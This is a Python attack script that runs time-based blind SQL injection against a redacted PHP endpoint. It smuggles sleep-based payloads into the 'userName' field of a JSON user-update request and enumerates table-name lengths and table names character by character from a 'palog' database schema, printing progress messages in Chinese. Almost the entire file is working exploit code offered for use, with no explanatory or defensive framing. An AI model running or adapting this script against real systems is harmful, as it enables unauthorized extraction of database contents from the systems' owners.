import time
import string
import requests
characters = string.ascii_letters + string.digits
import logging
logging.captureWarnings(True)

url = 'https://xxxx.php'
headers = {
    'Content-Type': 'application/json'
}
def data_post(payload):
    data = """{
        "syncInfo": {
            "operationType": "UPDATE_USER",
            "stru": {
                "struId": "1",
                "organId": "1",
                "struType": "1",
                "parentId": "1",
                "struPath": "1",
                "organCode": "1",
                "organName": "1",
                "organType": "1",
                "departmentId": "1",
                "departmentName": "1",
                "corporationName": "1",
                "isLeaf": "1",
                "isUse": "1"
            },
            "user": {
                "userId": "1",
                "userName": """+payload+""",
                "employeeId": "1",
                "departmentId": "1",
                "departmentName": "1",
                "coporationId": "1",
                "corporationName": "1",
                "userSex": "1",
                "userDuty": "1",
                "userBirthday": "1",
                "userPost": "1",
                "userPostCode": "1",
                "userAlias": "1",
                "userRank": "1",
                "userPhone": "1",
                "userHomeAddress": "1",
                "userMobilePhone": "1",
                "userMailAddress": "1",
                "userMSN": "1",
                "userNt": "1",
                "userCA": "1",
                "userPwd": "1",
                "userClass": "1",
                "parentId": "1",
                "bxlx": "1"
            }
        }
    }"""
    return data


def requ_biao():
    for i in range(0,30):
        for a in range(0,30):
            payload = """"1' and if(length((select table_name from information_schema.tables where table_schema='palog' limit 0,"""+str(i)+"""))="""+str(a)+""",sleep(1),1)#\""""
            data = data_post(str(payload))
            print(data)
            time_init = time.time()
            requests.post(url=url, data=data, headers=headers, proxies={'http': 'http://127.0.0.1:8080'},verify=False)
            time_desy = time.time()
            time_easy = time_desy-time_init
            if time_easy> float(8):
                print("第"+str(i)+"个表长度为"+str(a))
                break
            else:
                # print("正在验证第"+str(i)+"表长度"+str(a))
                print()
def requ_biao_dump():
    tables = ''
    for i in range(0,20):
        for a in characters:
            # ?id = 1 and if (substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1), 1, 1)='n', sleep(3), 1)

            payload = f""""1' and if (substr((select table_name from information_schema.tables where table_schema='palog' limit 0, 1), {i}, 1)='{a}', sleep(1), 1)#\""""
            data = data_post(str(payload))
            # print(data)
            time_init = time.time()
            requests.post(url=url, data=data, headers=headers, proxies={'http': 'http://127.0.0.1:8080'},verify=False)
            time_desy = time.time()
            time_easy = time_desy-time_init
            if time_easy> float(8):
                print("第"+str(i)+"个表名为"+str(a))
                tables+=a
                print("[+] table: ",tables)
                break
            else:
                print("",end="")
if __name__ == '__main__':
    requ_biao_dump()